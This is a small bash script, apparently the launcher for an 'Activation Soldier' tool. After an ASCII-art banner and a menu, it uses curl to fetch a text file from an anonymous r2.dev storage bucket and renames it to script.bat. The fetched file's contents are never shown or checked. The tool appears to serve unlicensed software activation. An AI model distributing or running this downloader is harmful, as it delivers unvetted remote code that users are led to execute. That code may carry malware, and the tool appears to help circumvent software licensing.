#!/bin/bash


cat << "EOF"
                          .':cc:;'.
                        :kxxxkxkkkxc
                       ,xdooolc:codxx.
                      ,dlllllc;'':dodc
                      lc;;clc:;'';:cod.
                      .,...''''..',,';c;
                       ..,,c:::c;;:.';;,
                        ';.:lllccl:,.
                      ,,cl:';::;:;,
                    'cll::c:,'',;,:..
                  ;odddoc;::::;;;';oxxl,.   .'.
               .cxxlcldooc;;,,,:,,coodxdxkll;'',
              cxdodoc:ldoolllccccololloxl:,,.'..,
            .dxxdolll:col:;::cc,;,',c:;,'...;:d,'.
           .colllollllcolcclc;,'.......':;;;lco;'
          .lcclol::ldo:cc:;';..........,;''...':.
          ,occlllc,,:c;:,;.,,..................'l.
         'oc;,,;;c:'.','............'''........'::
        .l:c:oodxko.............'.';,',,''......:;
        .ccclloolll,............''.,;;,;:l;',','':
        .lc::;,c;',,'.........':cc,,cc;l;:;',:cc:'
         ;:;::;,''...,.......'',;:;,;c,::;.';lo::;
          .'''''''....',''....'':cc,cl:c:,.',c:c;:
                ..;,,,,;:::'..',c::,,;;;,,:;;::c:.
                  .:;:;,':::;,','';;;:;c:ddc:...
                     c:;,;;;;;:c;c:;::::co,';:
                    .dolc::;;;;;;;;;;;'',lc::cl
                    lo::llcc::::;,,,;:,::lxo:lx.
EOF

# Display welcome message
echo "Welcome to Activation Soldier!"


echo "select an option to continue"
echo "1) Download Activation Power"
echo "2) Exit"


read -p "Enter your choice (1 or 2): " choice


case $choice in
  1)
    # Download the file
    echo "Downloading the file..."
    curl -o act.txt https://pub-c1de1cb456e74d6bbbee111ba9e6c757.r2.dev/act.txt

    # Rename the file to .bat
    mv act.txt script.bat
    echo "File downloaded and renamed to script.bat"
    ;;
  2)
    # Exit the script
    echo "Exiting the script. Goodbye!"
    exit 0
    ;;
  *)
    # Handle invalid input
    echo "Invalid choice. Please enter 1 or 2."
    ;;
esac

